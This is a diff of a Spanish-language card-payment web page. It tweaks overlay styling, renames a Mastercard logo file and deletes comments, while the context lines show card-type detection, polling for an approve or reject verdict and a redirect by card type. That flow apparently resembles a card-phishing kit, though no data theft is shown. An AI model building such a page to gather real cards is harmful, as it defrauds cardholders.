@@ -486,8 +486,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(4px);
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(8px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -504,7 +504,7 @@
             padding: 40px 48px;
             max-width: 420px;
             width: 90%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
             text-align: center;
             animation: slideUp 0.4s ease-out;
         }
@@ -951,7 +951,7 @@
                                 </div>
                                 <div class="payment-logos">
                                     <img src="visa.png" alt="Visa" title="Visa">
-                                    <img src="master.png" alt="Mastercard" title="Mastercard">
+                                    <img src="mastercard.png" alt="Mastercard" title="Mastercard">
                                     <img src="ame.png" alt="American Express" title="American Express">
                                 </div>
                             </div>
@@ -1073,7 +1073,7 @@
         };
 
         // ============================================
-        // MAPA DE LOGOS DE TARJETAS
+        // MAPA DE LOGOS DE TARJETAS PARA LA CARGA
         // ============================================
         const cardLogos = {
             'visa': 'visa.png',
@@ -1206,7 +1206,7 @@
                 cardLogo.appendChild(img);
             } else if (type === 'mastercard') {
                 const img = document.createElement('img');
-                img.src = 'master.png';
+                img.src = 'mastercard.png';
                 img.alt = 'Mastercard';
                 cardLogo.appendChild(img);
             } else if (type === 'amex') {
@@ -1325,10 +1325,8 @@
             if (bankLogoFile) {
                 bankLogoImg.src = bankLogoFile;
                 bankLogoImg.alt = banco;
-                // Mostrar el contenedor del banco
                 document.querySelector('.logo-item:last-child').style.display = 'flex';
             } else {
-                // Ocultar el logo del banco si no existe
                 document.querySelector('.logo-item:last-child').style.display = 'none';
                 document.querySelector('.logo-divider').style.display = 'none';
             }
@@ -1352,7 +1350,6 @@
             const steps = duration / interval;
             const increment = 100 / steps;
             
-            // Reiniciar barra
             progressFill.style.width = '0%';
             progressPercentage.textContent = '0%';
             
@@ -1361,7 +1358,6 @@
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(timer);
-                    // Redirigir después de completar
                     setTimeout(() => {
                         redirigirSegunTipoTarjeta(tipoTarjeta);
                     }, 400);
@@ -1490,7 +1486,6 @@
 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
-                    // Mostrar pantalla de carga con barra de progreso
                     mostrarCargaConLogos(cardType, banco);
 
                 } else if (resultado === 'rejected') {
@@ -1561,10 +1556,8 @@
 
             solicitudId = generarSolicitudId();
 
-            // Mostrar loading overlay inicial (con spinner)
             loadingOverlay.classList.add('active');
             
-            // Resetear estado de la card de carga
             initialSpinner.style.display = 'block';
             initialSpinner.classList.add('active');
             logosHeader.style.display = 'none';
@@ -1572,7 +1565,6 @@
             loadingText.textContent = 'Procesando pago...';
             loadingSubtext.textContent = 'Verificando información de la tarjeta';
             
-            // Ocultar logos del banco que no tengan imagen
             document.querySelector('.logo-item:last-child').style.display = 'flex';
             document.querySelector('.logo-divider').style.display = 'block';
 
@@ -1644,4 +1636,4 @@
         });
     </script>
 </body>
-                                                                                       </html>
+                                                                              </html>
